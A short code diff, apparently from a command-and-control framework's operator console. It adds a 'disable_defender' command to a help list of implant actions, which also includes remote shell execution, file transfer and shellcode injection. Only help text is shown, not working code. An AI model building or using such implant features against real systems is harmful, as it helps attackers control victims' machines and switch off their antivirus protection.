@@ -35,6 +35,7 @@ COMMANDS = {
 INTERACT_COMMANDS = {
     "cmd <args>": "Execute a shell command on the implant",
     "download <remote_path>": "Download a file from the implant",
+    "disable_defender": "Try to disable Windows Defender (will not work if user is not admin)",
     "upload <local_path> <remote_path>": "Upload a file to the implant and store it in <remote_path>",
     "inject <shellcode_path> <process_name>": "Spawn a process then inject shellcode into it",
     "sysinfo": "Get system information from the implant",
